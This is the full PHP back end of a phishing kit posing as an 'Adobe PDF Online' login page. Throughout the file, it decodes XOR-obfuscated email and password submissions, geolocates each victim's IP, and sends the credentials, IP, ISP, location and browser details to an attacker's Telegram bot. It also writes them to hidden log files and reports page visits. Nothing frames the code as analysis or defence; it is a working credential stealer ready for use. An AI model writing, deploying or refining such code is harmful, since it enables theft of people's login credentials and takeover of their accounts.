<?php
include 'config.php'; // BOT_TOKEN and CHAT_ID defined
session_start();
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;

function sendTelegramMessage($botToken, $chatId, $message) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $botToken . "/sendMessage");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chatId, 'text' => $message, 'parse_mode' => 'Markdown']));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log('Telegram Error: ' . curl_error($ch));
    }
    curl_close($ch);
    return $response;
}

function deobfuscate($str, $key = 42) {
    $result = '';
    if (!is_string($str)) {
        error_log("Non-string input to deobfuscate: " . print_r($str, true));
        return $str;
    }
    for ($i = 0; $i < strlen($str); $i++) {
        $result .= chr(ord($str[$i]) ^ $key);
    }
    if (is_numeric($result) && strpos($result, '.') === false) {
        return (int)$result;
    }
    return $result ?: 'Unknown';
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['visit'])) {
    $ip = $_SERVER['REMOTE_ADDR'];
    $city = deobfuscate($_POST['city'] ?? '');
    $country = deobfuscate($_POST['country'] ?? '');
    error_log("Raw visit data: city=" . ($_POST['city'] ?? 'null') . ", country=" . ($_POST['country'] ?? 'null'));
    // Server-side geolocation
    $ch = curl_init("https://ipapi.co/{$ip}/json/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $geoResponse = curl_exec($ch);
    if ($geoResponse === false) {
        error_log("Geolocation fetch failed for IP: $ip - " . curl_error($ch));
    } else {
        $geo = json_decode($geoResponse, true);
        if ($geo && isset($geo['city']) && isset($geo['country_name'])) {
            $city = $geo['city'];
            $country = $geo['country_name'];
        } else {
            error_log("Invalid geolocation data for IP: $ip - Response: " . $geoResponse);
        }
    }
    curl_close($ch);
    $msg = "👣 *Page Visited: AdobePDF*\n📍 *Location:* $city, $country";
    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $msg);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'], $_POST['password'])) {
    $email = htmlspecialchars(deobfuscate($_POST['email'] ?? ''));
    $password = htmlspecialchars(deobfuscate($_POST['password'] ?? ''));
    $stay = deobfuscate($_POST['stay'] ?? '');
    $ip = $_SERVER['REMOTE_ADDR'];
    $isp = deobfuscate($_POST['isp'] ?? 'N/A');
    $city = deobfuscate($_POST['city'] ?? '');
    $country = deobfuscate($_POST['country'] ?? '');
    $ua = deobfuscate($_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT']);
    $attempt = deobfuscate($_POST['attempt'] ?? '0');

    error_log("Raw login data: email=" . ($_POST['email'] ?? 'null') . ", city=" . ($_POST['city'] ?? 'null') . ", country=" . ($_POST['country'] ?? 'null'));

    if ($attempt === '0' || !is_numeric($attempt)) {
        error_log("Attempt decoding failed: " . print_r($_POST['attempt'], true));
        $attempt = 1;
    }

    // Server-side geolocation
    $ch = curl_init("https://ipapi.co/{$ip}/json/");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    $geoResponse = curl_exec($ch);
    if ($geoResponse === false) {
        error_log("Geolocation fetch failed for IP: $ip - " . curl_error($ch));
    } else {
        $geo = json_decode($geoResponse, true);
        if ($geo && isset($geo['city']) && isset($geo['country_name'])) {
            $city = $geo['city'];
            $country = $geo['country_name'];
        } else {
            error_log("Invalid geolocation data for IP: $ip - Response: " . $geoResponse);
        }
    }
    curl_close($ch);

    $msg = "🔐 Adobe PDF Online Login Attempt #$attempt\n\n"
         . "📧 *Email:* $email\n"
         . "🔑 *Password:* $password\n"
         . "Stay Signed In: $stay\n\n"
         . "🌍 *IP:* $ip\n🏢 *ISP:* $isp\n📍 *Location:* $city, $country\n🖥 *Browser:* $ua";

    sendTelegramMessage(BOT_TOKEN, CHAT_ID, $msg);

    $logDir = __DIR__ . '/logs/';
    if (!is_dir($logDir)) @mkdir($logDir, 0700, true);
    $logFile = $logDir . 'log_' . md5(uniqid()) . '.txt';
    file_put_contents($logFile, $msg . "\n---\n", FILE_APPEND);

    http_response_code(200);
    echo json_encode(['status' => 'ok']);
}

if (isset($_GET['test']) && $_GET['test'] === '1') {
    $testMessage = "✅ Test message from VPS at " . date('Y-m-d H:i:s');
    echo sendTelegramMessage(BOT_TOKEN, CHAT_ID, $testMessage);
}
?>